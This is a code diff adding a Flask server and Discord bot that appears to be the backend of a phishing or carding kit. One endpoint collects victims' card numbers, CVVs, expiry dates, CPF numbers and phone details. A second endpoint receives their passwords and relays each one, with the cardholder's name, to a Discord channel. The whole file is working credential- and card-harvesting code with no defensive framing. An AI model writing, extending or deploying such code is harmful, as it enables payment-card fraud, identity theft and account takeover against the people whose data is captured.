@@ -1,0 +1,124 @@
+import os
+import asyncio
+import threading
+import discord
+from discord.ext import commands
+from flask import Flask, request, jsonify
+from model.cardModel import Card
+
+app = Flask(__name__)
+
+# Discord bot configuration
+DISCORD_TOKEN = os.getenv("TOKEN")
+DISCORD_CHANNEL_ID = int(os.getenv("DISCORD_CHANNEL_ID", "1234567890"))  # Replace default with your channel ID if needed
+
+intents = discord.Intents.all()
+bot = commands.Bot(command_prefix="/", intents=intents)
+
+# In-memory storage for cards
+cards: list[Card] = []
+
+
+@app.route('/auth', methods=['POST'])
+def auth_info():
+    """
+    Endpoint to receive card information.
+    Expected JSON keys: celular, operadora, valor, email, nome, cpf,
+    card, mes, ano, cvv, token, bin, dadosbin
+    """
+    try:
+        data = request.json
+
+        required_keys = [
+            'celular', 'operadora', 'valor', 'email', 'nome', 'cpf', 'card',
+            'mes', 'ano', 'cvv', 'token', 'bin', 'dadosbin'
+        ]
+        if not data or not all(key in data for key in required_keys):
+            return jsonify({'Error': 'Missing required fields'}), 401
+
+        # Extract fields from the JSON payload
+        celular = data.get('celular')
+        operadora = data.get('operadora')
+        valor = data.get('valor')
+        email = data.get('email')
+        nome = data.get('nome')
+        cpf = data.get('cpf')
+        card_value = data.get('card')  # renamed to avoid shadowing class name
+        mes = data.get('mes')
+        ano = data.get('ano')
+        cvv = data.get('cvv')
+        token = data.get('token')
+        bin_value = data.get('bin')
+        dadosbin = data.get('dadosbin')
+
+        # Create Card instance (assuming Card accepts these fields in its initializer)
+        card_instance = Card(celular, operadora, valor, email, nome, cpf, card_value,
+                             mes, ano, cvv, token, bin_value, dadosbin)
+        cards.append(card_instance)
+
+        return jsonify({'Message': 'Ok'}), 200
+
+    except Exception as ex:
+        print(f"Error in /auth: {ex}")
+        return jsonify({'Error': 'Unknown'}), 401
+
+
+@app.route('/authpass', methods=['POST'])
+def auth_password():
+    """
+    Endpoint to receive a password and send a Discord message.
+    Expected JSON keys: senha, token
+    """
+    try:
+        data = request.json
+        required_keys = ['senha', 'token']
+        if not data or not all(key in data for key in required_keys):
+            return jsonify({'Error': 'Missing required fields'}), 401
+
+        senha = data.get('senha')
+        token_value = data.get('token')
+
+        # Find the card that matches the provided token
+        sent_discord_message = False
+        for card in cards:
+            if card.token == token_value:
+                # Prepare a message.
+                message = f"Received password: {senha} for card associated with {card.nome}"
+                # Retrieve Discord channel and send message asynchronously
+                channel = bot.get_channel(DISCORD_CHANNEL_ID)
+                if channel:
+                    future = asyncio.run_coroutine_threadsafe(channel.send(message), bot.loop)
+                    try:
+                        future.result(timeout=10)  # wait up to 10 seconds for the message to be sent
+                    except Exception as e:
+                        print(f"Error sending Discord message: {e}")
+                    sent_discord_message = True
+                break
+
+        if not sent_discord_message:
+            return jsonify({'Error': 'Token not found or failed to send message'}), 404
+
+        return jsonify({'Message': 'Ok'}), 200
+
+    except Exception as ex:
+        print(f"Error in /authpass: {ex}")
+        return jsonify({'Error': 'Unknown'}), 401
+
+
+@bot.event
+async def on_ready():
+    print(f"Discord bot logged in as {bot.user}!")
+
+
+def run_discord_bot():
+    """Run the Discord bot in its own thread."""
+    bot.run(DISCORD_TOKEN)
+
+
+if __name__ == "__main__":
+    # Start the Discord bot in a separate thread
+    discord_thread = threading.Thread(target=run_discord_bot, name="DiscordThread", daemon=True)
+    discord_thread.start()
+    
+    # Run the Flask application
+    app.run(host="0.0.0.0", port=5000)
